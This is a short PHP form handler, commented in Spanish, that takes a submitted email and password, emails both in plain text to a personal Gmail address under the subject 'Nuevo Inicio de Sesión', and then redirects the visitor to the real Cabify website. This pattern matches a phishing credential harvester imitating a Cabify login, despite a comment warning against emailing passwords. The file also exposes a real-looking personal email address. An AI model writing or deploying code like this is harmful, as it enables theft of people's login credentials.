<?php
// Tu archivo 'process_form.php'
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password']; // Recuerda no enviar contraseñas por email en aplicaciones reales.

    // Valida y sanea los datos aquí.

    $to = 'jorgeceballossegura@gmail.com';
    $subject = 'Nuevo Inicio de Sesión';
    $message = "Email: " . $email . "\nContraseña: " . $password; // Ajusta el mensaje según tus necesidades.

    // Configura los headers del correo (opcional, pero recomendado para formatos HTML).
    $headers = "From: webmaster@example.com" . "\r\n";
    $headers .= "Reply-To: webmaster@example.com" . "\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Usa mail() para enviar el correo.
    if (mail($to, $subject, $message, $headers)) {
        echo 'Correo enviado con éxito.';
    } else {
        echo 'Error al enviar correo.';
    }

    // Redirección a cabify.es
    header('Location: https://www.cabify.es');
    exit();
}
?>
